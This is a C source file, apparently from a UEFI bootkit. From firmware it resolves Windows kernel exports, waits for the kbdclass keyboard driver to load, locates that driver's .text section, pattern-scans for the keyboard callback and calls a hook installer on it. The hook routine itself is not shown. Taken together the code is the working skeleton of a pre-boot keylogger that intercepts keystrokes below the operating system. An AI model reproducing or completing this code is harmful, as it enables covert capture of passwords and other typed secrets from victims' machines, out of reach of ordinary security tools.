#include "Kernel.h"

//finding function by name in Export Table
VOID* EFIAPI FindNtosExportByName(VOID *kernelBase , CHAR8* exportName)
{
    SerialWrite("hello from FindNtosExportByName \n");
    SerialWrite("kernelBase = ");
    SerialWriteHex((UINT64)kernelBase);
    SerialWrite("exportName = ");
    SerialWrite(exportName);
    EFI_IMAGE_DOS_HEADER* DosHeaders = (EFI_IMAGE_DOS_HEADER*)kernelBase;
    EFI_IMAGE_NT_HEADERS64* NtHeaders = (EFI_IMAGE_NT_HEADERS64*)((UINT8*)kernelBase + DosHeaders->e_lfanew);
    UINT32 exportDirRva = NtHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportDirRva == 0) {
            SerialWrite("here \n");
        return NULL;
    }
    EFI_IMAGE_EXPORT_DIRECTORY* ExportDirReal = (EFI_IMAGE_EXPORT_DIRECTORY*)(exportDirRva + (UINT8*)kernelBase);
    UINT32* names = (UINT32*)((UINT8*)kernelBase + ExportDirReal -> AddressOfNames);
    UINT32* functions = (UINT32*)((UINT8*)kernelBase + ExportDirReal -> AddressOfFunctions);
    UINT16* ordinals = (UINT16*)((UINT8*)kernelBase + ExportDirReal -> AddressOfNameOrdinals);

    for (UINT32 i = 0; i < ExportDirReal->NumberOfNames; i++)
    {
        CHAR8* currentName = (CHAR8*)((UINT8*)kernelBase + names[i]);
        if (AsciiStrCmp(currentName, exportName) == 0)
        {
            //found!!!
            UINT32 FuncRVA = functions[ordinals[i]];
            VOID* finalAddress = (VOID*)((UINT8*)kernelBase + FuncRVA);
            SerialWrite("Found Export: ");
            SerialWrite(exportName);
            SerialWrite(" at: ");
            SerialWriteHex((UINT64)finalAddress);
            return finalAddress;
        }
    }
    SerialWrite("Export NOT found\n");
    return NULL;
}

PKLDR_DATA_TABLE_ENTRY FindKbdclassModule()
{
    if (!g_PsLoadedModuleList)
        return NULL;

    LIST_ENTRY* head = g_PsLoadedModuleList;
    LIST_ENTRY* next = head->ForwardLink;
    UINT32 count = 0;
    while (next != head && count < 500)
    {
        PKLDR_DATA_TABLE_ENTRY module = CONTAINING_RECORD(next, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

        if (module->BaseDllName.Buffer)
        {
            CHAR16* name = module->BaseDllName.Buffer;
            if ((name[0] == L'k' || name[0] == L'K') && (name[1] == L'b' || name[1] == L'B') && (name[2] == L'd' || name[2] == L'D'))
            {
                return module;
            }
        }
        next = next->ForwardLink;
        count++;
    }

    return NULL;
}

VOID ScanForKeyboardDriver()
{
    PKLDR_DATA_TABLE_ENTRY module = FindKbdclassModule();
    if (!module)
    {
        SerialWrite("kbdclass not found\n\r");
        return;
    }
    g_KbdBaseAddress = module->DllBase;
    SerialWrite("\n\r****************************************\n\r");
    SerialWrite("Base Address: ");
    SerialWriteHex((UINT64)g_KbdBaseAddress);
    SerialWrite("****************************************\n\r\n\r");
    VOID* textBase = NULL;
    UINT32 textSize = 0;

    if (!GetTextSection( g_KbdBaseAddress, &textBase, &textSize))
    {
        SerialWrite("Failed locating .text\n\r");
        g_KeyboardFound = 0;
        return;
    }

    SerialWrite("Found .text section!\n\r");
    SerialWrite("VirtualAddress: ");
    SerialWriteHex((UINT64)textBase);
    SerialWrite("VirtualSize: ");
    SerialWriteHex((UINT64)textSize);
    VOID* callback = FindKeyboardCallback( textBase, textSize);

    if (callback)
    {
        SerialWrite("Candidate callback:\n\r");
        SerialWriteHex((UINT64)callback);
        //SerialWrite("About to read memory...\n\r");
        //DumpBytesInline(callback, 64);
    }
    if (!callback)
    {
        SerialWrite("Pattern Scan Failed - Check Signature !!!\n\r");
        g_KeyboardFound = 0;
        return;
    }
    InstallKeyboardHook(callback);
    g_KeyboardFound = 0;
}

VOID EFIAPI CheckDriverCallback(UNICODE_STRING* DriverName)
{
    if (!DriverName || !DriverName->Buffer)
        return;

    if (IsKeyboardDriverName(DriverName))
    {
        if (!g_KeyboardFound)
        {
            SerialWrite("!!! Target Detected: kbdclass is loading, arming scanner... !!!\n\r");
            g_KeyboardFound = 1;
        }
    }

    if (g_KeyboardFound && g_PsLoadedModuleList)
    {
        SerialWrite("\n\r--- Scanning PsLoadedModuleList ---\n\r");

        ScanForKeyboardDriver();
    }
}

BOOLEAN IsKeyboardDriverName(UNICODE_STRING* DriverName)
{
    CHAR16* name = DriverName->Buffer;
    UINT16 len = DriverName->Length / 2;

    for (UINT16 i = 0; i < len - 3; i++) {

        if ((name[i] == L'k' || name[i] == L'K') &&
            (name[i + 1] == L'b' || name[i + 1] == L'B') &&
            (name[i + 2] == L'd' || name[i + 2] == L'D'))
        {
            return TRUE;
        }
    }

    return FALSE;
}

BOOLEAN GetTextSection(VOID* ImageBase, VOID** TextBase, UINT32* TextSize)
{
    EFI_IMAGE_DOS_HEADER* dos = (EFI_IMAGE_DOS_HEADER*)ImageBase;
    if (dos->e_magic != 0x5A4D)
        return FALSE;

    EFI_IMAGE_NT_HEADERS64* nt = (EFI_IMAGE_NT_HEADERS64*)((UINT8*)ImageBase + dos->e_lfanew);

    if (nt->Signature != 0x00004550)
        return FALSE;

    EFI_IMAGE_SECTION_HEADER* section = (EFI_IMAGE_SECTION_HEADER*)((UINT8*)nt + sizeof(UINT32) + sizeof(EFI_IMAGE_FILE_HEADER) + nt->FileHeader.SizeOfOptionalHeader);

    for (UINT16 i = 0; i < nt->FileHeader.NumberOfSections; i++)
    {
        if (CompareMem(section[i].Name, ".text", 5) == 0)
        {
            *TextBase = (UINT8*)ImageBase + section[i].VirtualAddress;
            *TextSize = section[i].Misc.VirtualSize;
            return TRUE;
        }
    }

    return FALSE;
}